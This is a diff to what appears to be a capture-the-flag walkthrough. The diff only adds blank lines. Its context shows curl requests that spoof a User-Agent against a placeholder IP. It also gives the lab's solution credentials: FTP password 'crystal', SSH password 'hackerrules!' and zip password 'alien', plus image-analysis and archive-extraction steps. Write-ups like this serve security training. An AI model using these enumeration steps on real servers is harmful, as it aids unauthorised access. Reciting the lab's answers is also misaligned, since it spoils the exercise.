@@ -25,6 +25,7 @@
 
 #### Command:
  I sent a request using curl with "R" as a User-Agent 
+ 
  curl -A "R" -i  http://IP
 #### Output:
 
@@ -37,6 +38,7 @@
 #### Output:
 
 ![alt text](images/image-4.png)
+
  The server returned a Location header pointing to a file named agent_C_attention.php
 #### Command:
  curl -i http://IP/agent_C_attention.php  
@@ -51,6 +53,7 @@
 #### Output:
 
 ![alt text](images/image-6.png)
+
 password found : crystal
 
 ## ftp Connection (as chris)
@@ -86,6 +89,7 @@ password found : crystal
 #### Output:
 
 ![alt text](images/image-11.png)
+
  SSH login password : hackerrules!
 
 ### Searching in cute-alien.jpg 
@@ -94,6 +98,7 @@ password found : crystal
 #### Output:
 
 ![alt text](images/image-12.png)
+
  we found a zip archive data named To_agentR.txt
 
 #### Command: 
@@ -119,6 +124,7 @@ password found : crystal
 #### Output:
 
 ![alt text](images/image-15.png)
+
  Zip file password: alien
 #### Command:
  7z x 8702.zip
